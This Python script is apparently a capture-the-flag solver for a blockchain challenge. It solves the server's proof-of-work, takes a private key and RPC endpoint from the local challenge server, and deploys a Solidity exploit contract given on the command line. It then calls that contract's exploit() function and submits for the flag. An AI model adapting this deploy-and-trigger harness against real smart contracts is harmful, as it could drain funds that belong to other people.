from pwn import *
import hashlib
import sys
import subprocess
import json
from web3 import Web3
from eth_account import Account

###Util
def POW(r,dev=True):
    if dev is True:
        r.sendlineafter('> ','secret')
        return
    chal = r.recvline()
    prefix = chal.split(b'(')[1].split(b'+')[0]
    target= '0'*int(chal.split(b'(')[-1].split(b')')[0])
    cnter = 0
    while True:
        bits = ''.join(bin(i)[2:].zfill(8) for i in hashlib.sha256(prefix+str(cnter).encode()).digest())
        if bits.startswith(target):
            print(cnter)
            r.sendlineafter('> ',str(cnter))
            return
        cnter+=1

def getinfo():
    r = remote(ip,port)
    r.sendlineafter('action? ','1')
    POW(r,dev=False)
    r.recvuntil('information\n')
    info = {}
    for i in range(4):
        res = r.recvline().strip().split(b': ')
        info[res[0].strip().decode()] = res[1].strip().decode()
    return info

def compile(fname):
    return json.loads(subprocess.run(['solc','--combined-json','bin',fname],capture_output=True).stdout)['contracts'][f'{fname}:exp']['bin']

def deploy_contract(solution,value):
    def debug0(rcpt):
        print('status :',rcpt.status)
    def debug1(web3, contract_addr):
        event_filter = web3.eth.filter({'address':contract_addr})
        print('events : ')
        for Filter in event_filter.get_all_entries():
            print(Filter['data'])

    bytecode = compile(solution)
    info = getinfo()

    web3 = Web3(Web3.HTTPProvider(info['rpc endpoint'],request_kwargs={'timeout':60}))
    account = Account.from_key(info['private key'])

    txhash = web3.eth.sendTransaction({'from':account.address,
                                       'gas':9_500_000,
                                       'data':bytecode+info['setup contract'][2:].rjust(64,'0'),
                                       'value':Web3.toWei(value,'ether')})
    rcpt = web3.eth.getTransactionReceipt(txhash)
    contract_addr = rcpt.contractAddress
    #debug0(rcpt)
    #debug1(web3, contract_addr)

    txhash = web3.eth.sendTransaction({'from':account.address,
                                       'to':contract_addr,
                                       'gas':9_500_000,
                                       'data':web3.sha3(text='exploit()')[:4],
                                       'value':Web3.toWei(0,'ether')})
    rcpt = web3.eth.getTransactionReceipt(txhash)
    #debug0(rcpt)
    #debug1(web3, contract_addr)

    return info['uuid']

def submit_sol(uuid):
    r = remote(ip,port)
    r.sendlineafter('action? ','2')
    r.sendlineafter('uuid? ',uuid)
    return r.recvline().strip()

###Exploit
ip = '127.0.0.1'
port = 10101

if len(sys.argv)!=3:
    print(f'usage : exp.py [contract] [eth]')
    exit()
uuid = deploy_contract(sys.argv[1],int(sys.argv[2]))
flag = submit_sol(uuid)
print(flag)
